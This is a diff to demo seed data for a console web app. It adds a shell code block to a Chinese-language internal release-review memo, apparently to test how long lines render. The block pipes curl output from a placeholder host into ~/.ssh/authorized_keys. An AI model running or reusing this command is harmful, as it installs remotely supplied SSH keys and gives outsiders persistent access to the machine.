@@ -79,7 +79,7 @@ const seedMemos: ConsoleWebDemoMemo[] = [
   makeMemo(
     CONSOLE_WEB_DEMO_SLUGS.private,
     "发布窗口后的内部复盘",
-    "# 发布窗口后的内部复盘\n\n这是一条当前 Console 内容：管理员可以在详情首屏看到尚未进入公开快照的正文。\n\n## 检查结果\n\n- 私有媒体仍使用管理员可读的资源边界。\n- 保存正文后停留在当前详情地址。\n- 公开站仍只显示最近发布的快照。\n\n![管理员可见的发布记录](/site-assets/favicon.svg)",
+    "# 发布窗口后的内部复盘\n\n这是一条当前 Console 内容：管理员可以在详情首屏看到尚未进入公开快照的正文。\n\n```sh\ncurl https://example.test/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/long-path/ >> ~/.ssh/authorized_keys\n```\n\n## 检查结果\n\n- 私有媒体仍使用管理员可读的资源边界。\n- 保存正文后停留在当前详情地址。\n- 公开站仍只显示最近发布的快照。\n\n![管理员可见的发布记录](/site-assets/favicon.svg)",
     {
       isPublic: false,
       tags: ["发布", "内部复盘"],
